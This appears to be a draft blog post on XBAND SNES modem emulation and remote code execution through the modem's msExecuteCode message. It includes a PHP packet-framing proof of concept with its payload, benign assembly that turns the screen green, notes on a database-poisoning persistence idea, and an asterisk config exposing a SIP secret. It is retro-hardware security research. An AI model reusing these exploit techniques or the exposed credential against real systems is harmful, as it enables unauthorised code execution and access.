- record gifs of the debugger hitting breakpoint for the executeCode routine
    - you did this! Recorded the method being hit and the stepping into the code. At this point you would have explained _how_ you found the correct addresses for doexecutecode
- record video of the POC working
     - the roofgarden server just needs to be run and the hardware connected to it. Seems you still have the roofgarden client setup with the screen green payload. `xband_bootstrap_small` has the right build.
- make a release of the emulator with changes to take a playerID
- Continue adding  to and editing the content
	- double check how msg dispatch works (is the dispatch vector the same for the OS and ServerTalk just with different offsets?)
	- add the section about the two main bugs during development (non-block sockets and buffer overflow)
	- add the brief section about failed bug hunting
	- update the sections on code execution with new images (maybe a gif) and code snippets that demonstrate the actual payload you used to turn the screen green.

finishing writing section on where you looked for bugs, put it before code execution section

start moving all the content into liquid format and start rendering it locally

update all the images and gifs

re-read

make a release ready version of the emulator

.
---
 



Long before the advent of the modern internet, online gaming had a fractured but active community. One piece of hardware that made this possible on the Super Nintendo Entertainment System was the XBAND Video Game Modem.

As someone very interested in the early internet, I thought it would be fun to dig into the XBAND and learn more about the cartridge. Originally interested in the device from a security perspective, this project quickly led me to adding emulated support for the XBAND on SNES emulators and building out a debugging environment. Below is my attempt to document what I learned along the way in the hopes that it servces as a reference for anyone else interested in getting started with XBAND projects. 

We'll be begin with how emulation support was imlemented, dig into how the XBAND works and finish with how I was able to execute arbitrary code on my Super Nintendo, through a phone line, in the year 2022.

## XBAND (what is it even?)
Xband, designed by Catapult Entertainment, was a video game modem for game consoles of the early 90s. Efforts to revive the XBAND network have sprung up throughout the years by various groups. Most recently, @argirisan from the  Retrocomputing network managed to host a functional XBAND server. Details on this latest revival and the history of expand are available [here](https://xband.retrocomputing.network/) and [here](https://www.youtube.com/watch?v=k_5M-z_RUKA).

I spent time [wrtiting software for the SNES](https://github.com/fresh-eggs/snes-northsec-2021) for the [Northsec CTF](https://nsec.io/competition/) in 2021 and decided to make use of my SNES architecture literacy by spendings time bug hunting on the XBAND for SNES.

## Designing Test Infrastructure
In order to have a functional debug environment, I opted for a software based approach given the limited options available for hardware debugging on the SNES.

Searching around for emulation support for XBAND on the SNES yielded limited results. The only attempt I could find was in the [BS-X Project](https://project.satellaview.org). Forked from [BSNES](https://github.com/bsnes-emu/bsnes), the BSNES-SX2-v009 source code seemed to begin implementing support for the XBAND ROM but stopped short of actually being able to connect to an XBAND server.

With that in mind, I began looking for emulators with robust debugging. I eventually found the debug oriented fork of BSNES named [BSNES-PLUS](https://github.com/devinacker/bsnes-plus).

I decided it would be worthwhile investing time both porting and finishing the work in BSNES-SX2 over to BSNES-PLUS. Getting the XBAND ROM booting in a debug oriented emulator and connecting to the retrocomputing XBAND server was worth doing for my project and for games preservation in general. The only thing standing in my way was that I had no experience writting software for emulators but this was about to change!


## Building emulation Support

### Memory Mapping on the SNES Figuring out SRAM
First up was getting the retail ROM to boot on BSNES-PLUS. This proved to be more tricky than I anticipated.

The first step was getting the ROM mapped correctly into memory. This was followed by adding hooks into each read or write operation the emulator makes within the memory ranges used by XBAND and processing them appropriately.

In the emulator source, most of this takes place within the following:
- `common/nall/snes/cartridge.hpp`
- `bsnes/snes/chip/xband/xband_base.cpp`
- `bsnes/snes/chip/xband/xband_cart.cpp`

Below is a graphic demonstrating how memory is laid out within the Super Nintendo. The first byte in the 16bit address denotes the data bank, the next two denote the offset into that bank.

[attach image of the memory mapping you made]
![credits: https://emudev.de](/home/eggs/security/src/snes/blogpost/xband_memory_map.png  "XBAND Ranges Added to Memory ")
(credits: https://emudev.de)

The following are relevant memory ranges for the XBAND ROM:
```
  D00000h-DFFFFFh  1MB ROM
  E00000h-E0FFFFh  64K SRAM 
  FBC180h-FBC1BFh  I/O Ports 
```
(credits: https://problemkaputt.de/fullsnes.htm)

Below is an example of the memory range hooks for processing reads to XBAND SRAM and Memory Mapped I/O:
```c++
uint8 XBANDBase::read(unsigned addr) {
  
  // process reads for the memory range assigned to SRAM
  // 0xE00000 - 0xFAFFFF
  // 0xFB0000 - 0xFBBFFF
  //(0xFBC000 - 0xFBFE00)
  // 0xFC0000 - 0xFFFFFF
  // 0x600000 - 0x7DFFFF
  if(within<0xe0, 0xfa, 0x0000, 0xffff>(addr)
  || within<0xfb, 0xfb, 0x0000, 0xbfff>(addr)
  || within<0xfc, 0xff, 0x0000, 0xffff>(addr)
  || within<0x60, 0x7d, 0x0000, 0xffff>(addr)) {
  	addr = (addr & 0xffff);
	addr = bus.mirror(addr, memory::xbandSram.size());
    return memory::xbandSram.read(addr);
  }
  [...]
}
```

### Porting the Retrocomputing Network Genesis Implementation
In addition to hosting a functional server, @argirisan built support for the Genesis XBAND ROM into the BLASTEM emulator.

This work served invaluable in my attempt to add support to BSNES-PLUS to connect the XBAND ROM to the retrocomputing servers. While there were a number of differences between the two consoles, having this as a reference made all the difference and I doubt the project would be in this state without it.

In short, getting the ROMs connected to the new servers required emulating the Memory Mapped I/O (MMIO) interactions between the XBAND ROM and the Rockwell Modem included on the cartridge.

To do this, we simply capture reads to the MMIO memory ranges, calculate the correct offset for those ranges to deduce the intended rockwell register and process the read or write operation accordingly.

Below is an example snippet of the read hooks for the Rockwell MMIO ranges:

```C
uint8 XBANDBase::read(unsigned addr) {

  //0xFBC000 -- 0xFBFE00
  if(within<0xfb, 0xfb, 0xc000, 0xfdff>(addr)) {
	  uint8 reg = (addr-0xFBC000)/2;
		
    if (reg == 0x7d)
			return 0x80;
		//if (reg == 0x7c) //kAddrStatus
		//	return 0;
		if (reg == 0xb4) //kLEDData
			return 0x7f;

		if (reg == 0x94) { //krxbuff
			if (x->rxbufused >= x->rxbufpos) return 0;
			uint8_t r = x->rxbuf[x->rxbufused];
			x->rxbufused++;
			if (x->rxbufused == x->rxbufpos) {
				x->rxbufused = x->rxbufpos = 0;
			}
			fprintf(stderr, "[+][modem][krxbuff] FRED FIFO Read: 0x%x\n", r);
			return r;
		}
		[...]
```
For more information on how to interface with the MMIO registers provided by the Rockwell Modem, please consult the following resources:
- [Table 3.1 in the Rockwell Modem Datasheet](RC2324DPL.pdf)
- [The Rockwell Modem Designer's Guide](rockwell_modem_designer_guide.pdf)

In total this ate up a couple months of free time development with a number of issues along the way. With help from the retrocomputing discord and in particular @argirisan, we were finally able to connect the emulated XBAND SNES ROM to the XBAND network for what we believe to be the first time since ever!

![emulate xband rom receiving bandwidth news](/home/eggs/security/src/snes/blogpost/letsfuckingooooo.png  "emulate xband rom receiving bandwidth news")

![iconic](/home/eggs/security/src/snes/xband/iconic.png  "iconic")

More information on the genesis emulator and the retrocomputing network available [here](https://xband.retrocomputing.network/).

## How does XBAND Work

![XBAND PCB](/home/eggs/security/src/snes/blogpost/xband_PCB.jpg  "XBAND PCB")

Armed with a functional debugging environment thanks to emulation, I started digging into XBAND Source code that has found it's way onto the internet in order to understand exactly how it works.

The Xband was designed to send controller inputs between connected clients through the XBAND network with the help of the Rockwell Modem Model RC2324DP. By acting similar to a GameGenie, the XBAND OS would patch the ROM provided by the game cartridge inserted into it's slot with it's own instructions to capture and inject controller input. Truly wild stuff.

###ADSP
The protocol of choice for the XBAND was the Apple Data Streaming Protocol or ADSP. ADSP was able to provide a basic session layer between two hosts.

Packets are framed with a pre-pended null byte and a trailing `\x10\x03`. The data is pre-pended with the ADSP header detailed below.

![ADSP Header](/home/eggs/security/src/snes/blogpost/adsp_header_docs.png  "ADSP Header")

The XBAND would consume these with the help of the Rockwell modem, de-frame and push the packet onto an appropriate OS-managed FIFO for consumption.


Below is a screenshot from my debug build of BSNES-PLUS which dumps each ADSP packet and parses them for printing.
![ADSP ServerTalk Packet ](/home/eggs/security/src/snes/blogpost/adsp_degbug.png  "ADSP ServerTalk Packet ")

If you're interested in learning more, PDF copies of the developer manuals for ADSP are still _very_ available online.

I also have a debug oriented branch of the emulator available that allows for the injection of ADSP packets into the ROM (some assembly required):
https://github.com/fresh-eggs/bsnes-plus/tree/xband_pkt_injection

###ServerTalk / GameTalk
Networked communication on the XBAND ROM generally fits into two categories. ServerTalk and GameTalk.

![ServerTalk and GameTalk](/home/eggs/security/src/snes/blogpost/servertalk_and_gametalk.png  "ServerTalk and GameTalk")

ServerTalk is the list of routines for managing Server to Client commands while the GameTalk layer denotes client to client transfers of data during gameplay.

For the remainder of this article we'll focus on ServerTalk as Gameplay isn't yet fully emulated on either SNES or Genesis.

If you're interested in helping with that effort, please don't hesitate to get in touch with me (fresh-eggs) on the [retrocomputing discord](https://xband.retrocomputing.network/).

### Message Dispatch

The XBAND OS made heavy use of message dispatch in order to both service OS Function calls in addition to routing ServerTalk packets to their appropriate decoding routine. 

For those less familiar with message dispatching, think of it as an array of function pointers. In order for ServerTalk to function, the XBAND OS maintains a list of MessageIDs. Each MessageID corresponds to a parsing routine available in the ROM. The `_ReceiveServerMessageDispatch` function sets up a call to the `kDispatcherVector` which appears to calculate the relaitve address of corresponding handler given a set of params.

Below is a snippet of the C function with inline assembly that handles this for ServerTalk messages. It first loads the opCode(MessageID) into the `A` register followed by  jumping to the address of the MessageDispatcher.





```C
MessErr _ReceiveServerMessageDispatch( short opCode )
{
	opCodeProcPtr		opCodeProc;
	short				result;
	unsigned char		version;

	if ( opCode < kFirstServerMessage || 
		opCode > ( kFirstServerMessage + kReservedServerMessages ) )
	{
		return kUnrecognizedOpCodeError;
	}

	{
		short delta = kServerMessageBase;

		asm 
		{
			LDA		opCode	
			CLC
			ADC		delta
			TAX
			JSL		kDispatcherVector
			STA		result
		}
	}

	return result;
}
```

Below is a snippet of each of the documented ServerTalk message IDs expceted to have associated handlers:

```C
#define	kFirstServerMessage				1
#define msEndOfStream					2
#define	msGamePatch 					3
#define	msSetDateAndTime 				4
#define	msServerMiscControl 			5
#define msExecuteCode					9
#define msPatchOSCode					10
#define msRemoveDBTypeOpCode			12
#define	msRemoveMessageHandler			13
#define msRegisterPlayer				14
#define	msNewNGPList					15
#define	msSetBoxSerialNumber			16
#define	msGetTypeIDsFromDB				17
#define	msAddItemToDB					18
#define	msDeleteItemFromDB				19
#define	msGetItemFromDB					20 
#define	msGetFirstItemIDFromDB			21
#define	msGetNextItemIDFromDB			22
#define	msClearSendQ					23
#define msLoopBack						27		
#define msWaitForOpponent				28
#define msOpponentPhoneNumber			29
#define msReceiveMail					30
#define msNewsHeader					31
#define msNewsPage						32
#define msUNUSED1						33		
#define msQDefDialog					34
#define msAddAddressBookEntry			35
#define msDeleteAddressBookEntry		36
#define msReceiveRanking				37
#define	msDeleteRanking					38
#define	msGetNumRankings				39
#define	msGetFirstRankingID				40
#define	msGetNextRankingID				41
#define	msGetRankingData				42
#define	msSetBoxPhoneNumber				43
#define	msSetLocalAccessPhoneNumber		44
#define msSetConstants					45
#define	msReceiveValidPers				46
#define	msGetInvalidPers				47
#define msCorrelateAddressBookEntry		49
#define	msReceiveWriteableString		50
#define	msReceiveCredit					51
#define	msReceiveRestrictions			52
#define msReceiveCreditToken			53
#define msSetCurrentUserName			54
#define msSetBoxHometown				56
#define	msGetConstant					57
#define	msReceiveProblemToken			58
#define	msReceiveValidationToken		59
#define	msLiveDebitSmartCard			60
#define msSendDialScript				61
#define msSetCurrentUserNumber			62
#define msBoxWipeMind					63
#define msGetHiddenSerials				64
#define	msGetLoadedGameInfo				66
#define msClearNetOpponent				67
#define msGetBoxMemStats				68
#define msReceiveRentalSerialNumber		69
#define msReceiveNewsIndex				70
#define msReceiveBoxNastyLong			71
```

Below is a list I made of the SNES OS Function IDs that can be passed to the `kDispatcherVector` via the `X` register.

[XBAND SNES OS Function IDs]()


### List of symbols I collected.
During the course of this work, I collected a number of symbols from the Retail SNES XBAND ROM by setting breakpoints before jumps to the `kDispatcherVector` for a given function ID and noting the address that the `kDispatcherVector` resolved. There are symbol lists in the source code but I didn't find them to be accurate.

These will likely be useful for anyone working in this space. We could explore getting all of them programatically.

```
DoExecuteCode					(0xd57c8b)
TReadBytesReady					(0xd4ba0b)
TDataReady						(0xd4c579)
TDataReadySess					(0xd4c496)
TNetIdle						(0xd4d3f2)
PNetIdle						(0xd51220)
PUProcessIdle					(0xd518d8)
FifoRead						(0xd56177)
_PUProcessSTIdle				(0xd51988)
TIndication						(0xd4cc5f)
DoSendSendQElementsOpCode		(0xd5a976)
ProcessServerData				(0xd5cc99)
ReceiveServerMessageDispatch	(0xd5cbda)
GetSerialOpCode 				(0xd5cd91)
GetDataBytesReady				(0xd4fafd)
_SendMessage					(0xD5CBA6) 
GetDataError					(0xd4fb25)
TNetError						(0xd4ec8b)
TUGetError						(0xd4ed4f)
DecompressDataToBuffer			(0xd7ab0f)
kInitSoundMgr/_InitSoundMgr 	(0xd2be0c)
DBGetItem						(0xd07145)
```


## Remote Code Exectuion over the phone lines in 2022

### msExecuteCode
After spending a month hunting for bugs, I found one heap based overflow that did not appear expoitable. At this point, I decided it was time to revisit msExecuteCode.

Initially I thought this couldn't possibly be in the retail release right ? Let's find out!

Leveraging the packet injection function I added to the emulator, I built a ServerTalk packet intended to trigger an `msExecuteCode`.

To do this, I put together a one off tool written in PHP based off the work in Roofgarden to quickly frame a valid ADSP packet given ADSP data:

```php
<?php
    $crc_table = array(
        0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50a5, 0x60c6, 0x70e7,
        0x8108, 0x9129, 0xa14a, 0xb16b, 0xc18c, 0xd1ad, 0xe1ce, 0xf1ef,
        0x1231, 0x0210, 0x3273, 0x2252, 0x52b5, 0x4294, 0x72f7, 0x62d6,
        0x9339, 0x8318, 0xb37b, 0xa35a, 0xd3bd, 0xc39c, 0xf3ff, 0xe3de,
        0x2462, 0x3443, 0x0420, 0x1401, 0x64e6, 0x74c7, 0x44a4, 0x5485,
        0xa56a, 0xb54b, 0x8528, 0x9509, 0xe5ee, 0xf5cf, 0xc5ac, 0xd58d,
        0x3653, 0x2672, 0x1611, 0x0630, 0x76d7, 0x66f6, 0x5695, 0x46b4,
        0xb75b, 0xa77a, 0x9719, 0x8738, 0xf7df, 0xe7fe, 0xd79d, 0xc7bc,
        0x48c4, 0x58e5, 0x6886, 0x78a7, 0x0840, 0x1861, 0x2802, 0x3823,
        0xc9cc, 0xd9ed, 0xe98e, 0xf9af, 0x8948, 0x9969, 0xa90a, 0xb92b,
        0x5af5, 0x4ad4, 0x7ab7, 0x6a96, 0x1a71, 0x0a50, 0x3a33, 0x2a12,
        0xdbfd, 0xcbdc, 0xfbbf, 0xeb9e, 0x9b79, 0x8b58, 0xbb3b, 0xab1a,
        0x6ca6, 0x7c87, 0x4ce4, 0x5cc5, 0x2c22, 0x3c03, 0x0c60, 0x1c41,
        0xedae, 0xfd8f, 0xcdec, 0xddcd, 0xad2a, 0xbd0b, 0x8d68, 0x9d49,
        0x7e97, 0x6eb6, 0x5ed5, 0x4ef4, 0x3e13, 0x2e32, 0x1e51, 0x0e70,
        0xff9f, 0xefbe, 0xdfdd, 0xcffc, 0xbf1b, 0xaf3a, 0x9f59, 0x8f78,
        0x9188, 0x81a9, 0xb1ca, 0xa1eb, 0xd10c, 0xc12d, 0xf14e, 0xe16f,
        0x1080, 0x00a1, 0x30c2, 0x20e3, 0x5004, 0x4025, 0x7046, 0x6067,
        0x83b9, 0x9398, 0xa3fb, 0xb3da, 0xc33d, 0xd31c, 0xe37f, 0xf35e,
        0x02b1, 0x1290, 0x22f3, 0x32d2, 0x4235, 0x5214, 0x6277, 0x7256,
        0xb5ea, 0xa5cb, 0x95a8, 0x8589, 0xf56e, 0xe54f, 0xd52c, 0xc50d,
        0x34e2, 0x24c3, 0x14a0, 0x0481, 0x7466, 0x6447, 0x5424, 0x4405,
        0xa7db, 0xb7fa, 0x8799, 0x97b8, 0xe75f, 0xf77e, 0xc71d, 0xd73c,
        0x26d3, 0x36f2, 0x0691, 0x16b0, 0x6657, 0x7676, 0x4615, 0x5634,
        0xd94c, 0xc96d, 0xf90e, 0xe92f, 0x99c8, 0x89e9, 0xb98a, 0xa9ab,
        0x5844, 0x4865, 0x7806, 0x6827, 0x18c0, 0x08e1, 0x3882, 0x28a3,
        0xcb7d, 0xdb5c, 0xeb3f, 0xfb1e, 0x8bf9, 0x9bd8, 0xabbb, 0xbb9a,
        0x4a75, 0x5a54, 0x6a37, 0x7a16, 0x0af1, 0x1ad0, 0x2ab3, 0x3a92,
        0xfd2e, 0xed0f, 0xdd6c, 0xcd4d, 0xbdaa, 0xad8b, 0x9de8, 0x8dc9,
        0x7c26, 0x6c07, 0x5c64, 0x4c45, 0x3ca2, 0x2c83, 0x1ce0, 0x0cc1,
        0xef1f, 0xff3e, 0xcf5d, 0xdf7c, 0xaf9b, 0xbfba, 0x8fd9, 0x9ff8,
        0x6e17, 0x7e36, 0x4e55, 0x5e74, 0x2e93, 0x3eb2, 0x0ed1, 0x1ef0,
    );

    function crc_update($crcin, $datain) {
        global $crc_table;
        $crch = $crcin >> 8;
        $crcl = $crcin & 0xff;
        for ($i=0; $i<strlen($datain); $i++) {
            $a = $crch ^ ord($datain[$i]);
            $x = $a;
            $a = $crc_table[$x] >> 8;
            $a ^= $crcl;
            $crch = $a;
            $a = $crc_table[$x] & 0xff;
            $crcl = $a;
        }
        $crc = ($crch << 8) | $crcl;
        $crc &= 0xffff;
        return $crc;
    }

    function encapsulate($data) {
      return "\x00".$data;
    }

    function frame($data) {
        return str_replace("\x10", "\x10\x10", $data.pack("n", crc_update(0xffff, $data)^0xffff))."\x10\x03";
    }
    
    //STP instruction for execute code
    $payload = "\x05\x39\x00\x00\x00\x28\x00\x00\x02\x17\x04\x00\x40\x09\x00\x00\x00\x32\x9c\x21\x21\xa9\x1f\x8d\x22\x21\x9c\x22\x21\xa9\x0f\x8d\x00\x21\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA\xEA";

    print bin2hex(frame(encapsulate($payload)))
?>
```

The `$payload` variable contains the ADSP packet header, the ServerTalk opcode for `msExecuteCode` followed by our intructions:
[picture highlighting the sections]

The tool will calculate the CRC in addition to frameing the packet appropriately.

At this point, we should be able to set a breakpoint at the ServerTalk `kDispatcherVector` and see if injecting this packet resolves to the handling routine for   `msExecuteCode` messages.

Below is out packet:

[adsp_packet_for_do_execute_code_demo.png]

In order to see if this packet resolves to a handler that looks like `MessErr DoExecuteCodeMessageOpCode( void )` in the source, I set a breakpoint at in `_ReceiveServerMessageDispatch` to see where the `kDispatcherVector` resolves.

Sure enough, we end up resolving to a routing that looks excatly like `MessErr DoExecuteCodeMessageOpCode( void )`. I validated this by matching the structure of the XBAND OS function calls by OS Function ID. 

The following is the emulator hitting a breakpoint for the address of the routine that appears to match `MessErr DoExecuteCodeMessageOpCode( void )`:
[xband__hit_execute_do_code_method.gif]

We can see that it has a similar logical structure to the source code:
```C
MessErr DoExecuteCodeMessageOpCode( void )
{
long			length;
MessErr			result;
messageCodeProcPtr	myCodeProc;

	MESG("DoExecuteCodeMessageOpCode");

	GetDataSync( 4, (Ptr)&length );

	if ( GetDataError() )
		return ( kFatalStreamError );
	
	SWAP4(length);
	myCodeProc = (messageCodeProcPtr)NewMemory( kTemp,  length );
	GetDataSync( length, (Ptr)myCodeProc );
	[...]
```

[do_execute_code_asm.png]

We can validate this by using our OS Function lookup table to check the calls being made to `kDispatcherVector`. For instance:
```
LDX  #$0209
JSL   $e00040  (kDispatcherVector)
LDX  #$020b
JSL   $e00040  (kDispatcherVector)
```
These translate to `GetDataSync()` and `GetDataError()` respectively. Going through the rest of the assembly, you'll find the other calls match and the structure of the operations matches what the source intends.

It follows that we should jump to the function pointer containing our code to be executed at some point and indeed we do:
[xband__hit_do_execute_code_payload.gif]

![debugger_breakpoint_execute_code](/home/eggs/security/src/snes/blogpost/bytes.png  "debugger_breakpoint_execute_code")
 
### Writing a Payload

This small program will reset the state of important control registers like the Direct Page register and the Data Bank register followed by calling our routine at `MAIN`.

There were many prior failed attempts at getting my routine working properly, most of them had to do with my failure to account for all relevant state registers.

One other interesting constraint is the need for the payload to be position independent. There is no garuntee provided for the memory address our function pointer is assigned.

The following is our payload:
```
.INCLUDE "header.inc"

;===================
; start
;===================

.BANK 0 SLOT 0
.ORG 0
.SECTION "MainCode"

Start:
  sei                     ;disable interrupts
  clc                     ;switch to native mode
  xce

  rep #$38                ; mem/A = 16 bit, X/Y = 16 bit

  lda #$0000              ;set Direct Page = $0000
  tcd                     ;Transfer Accumulator to Direct Register
  pha                     ;push 8bit A onto the stack
  plb                     ;set the Data Bank to 0x00
  cli

MAIN:
  stz $2121               ;reset color palette register
  lda #%00011111
  sta $2122
  stz $2122
  lda #$0F
  sta $2100 
  bne MAIN

.ENDS
```

### Running the Payload on Real Hardware
In order to deliver this packet to real hardware, I decided to get a copy of the Roofgarden server running locally.

To do this, I needed to setup my first Software PBX! For this I used `asterisk`. With the help of @argirisan I setup a simple profile to answer calls from the XBAND modem when it dials `1-800-207-1194` and routed them to my local copy of Roofgarden running on my laptop with the help of a [softmodem extension](https://github.com/proquar/asterisk-Softmodem).

Here is the `asterisk` profile:
```
9:58:50 › cat /etc/asterisk/sip.conf 
[upaihddfqysqzigy]
context=default
type=friend
secret=ccCYWt7CUn4fr1j2
disallow=all
allow=ulaw
qualify=200
host=dynamic
directmedia=yes
nat=no


9:59:00 › cat /etc/asterisk/extensions.conf 
[default]
;exten => 18002071194,1,Set(conntype=800)
exten => 18002071194,1,Answer()
 same => n,Wait(2)
 same => n,Set(VOLUME(TX)=-3)
 same => n,Playtones(!2100/3300)
 same => n,Wait(3.375)
 same => n,Set(VOLUME(TX)=6)
 same => n,Set(VOLUME(RX)=3)
 same => n,Softmodem(localhost,56969,800-0123456789abcde2,v(V22bis)ln)
 same => n,Playtones(440,5000)
 same => n,Wait(5)
 same => n,Hangup()
 
 
9:59:12 › cat /etc/asterisk/modules.conf   
[modules]
autoload = yes
```

I've never been so excited for a shade of green in my life.

## Bug Hunting and Failed Exploitation Attempts

### Server Talk bugs

The XBAND Modem builds a database of stored setup information within SRAM.

Entries in this DB often contain routines that have function pointers pointing to them.


Really any function pointer in general could be vulnerable to takeover if you have control over DB items it relies on to caluclate the address.

I used this regex to find instances of function pointers:
\s\(\*.*\)\(


  Exploiting kSNESAudioDriverType
  - DoGetFirstItemIDFromDB(kSNESAudioDriverType)
  - DoDeleteItemFromDB(kSNESAudioDriverType, theID)
  - DoAddItemToDB(kSNESAudioDriverType, some_id)
    - theData is your payload 
  - at this point, the box DB should be poisoned with our payload as the SNES audio driver.
  - according to a comment in DBTypes.h, this value
  is not purged and should persist on a restart.
  - next time you restart your box, the driver should run and BAM


- seems you can overwrite any DB entry given you have the ID of the corresponding entry and your payload fits a certain size constraint.

- The remote message handler offers the follow DB related messages:
  msGetTypeIDsFromDB
  msAddItemToDB
  msDeleteItemFromDB
  msGetItemFromDB
  msGetFirstItemIDFromDB
  msGetNextItemIDFromDB

By leveraging those, you sould be able to resolve the ID for any item in the target DB.

- given that you potentially have total control over DB contents, are there any DB types that point to executbale code?



**bug in short _PutByte(register ByteContext *bytxt, register const unsigned char byte):

  // This logic allows for a single char to be written up to 244 times 
  // Given the following params, you set the rleChar, followed by writting it
  // 244 times on the second call to PutByte
  // bufsize = 4, bytxt->rleFlag = 1, [kRLEescape, some_rle_char, 255], bytxt->rleState = 2, 

After ripping through these, I started digging through the list of MessageIDs for anything with potentially dangerouns functionality:
	msRegisterPlayer
	msExecuteCode
	msNewsPage
	msNewsHeader
	msReceiveMail
	msAddAddressBookEntry 
	msSetCurrentUserName
	msSetBoxHometown
	msSendDialScript
	msReceiveBoxNastyLong


	Mail bug
	
	News Compression algos

	???

	Message bugs (found but unexploitable)

	List of Interesting MessageIDs:
 		msRegisterPlayer      (not inspected)
 		msExecuteCode         (exploitable)
 		msNewsPage            (rendering bugs)
 		msNewsHeader          (rendering bugs)
 		msReceiveMail         (rendering bugs)
 		msAddAddressBookEntry 
 		msSetCurrentUserName
 		msSetBoxHometown
 		msSendDialScript
 		msReceiveBoxNastyLong

## What is next

Emulate gameplay to mess with Client Talk bugs

Hunt for more exploitable Server Talk Bugs


## Attach release of emulator and the branch with packet injection .
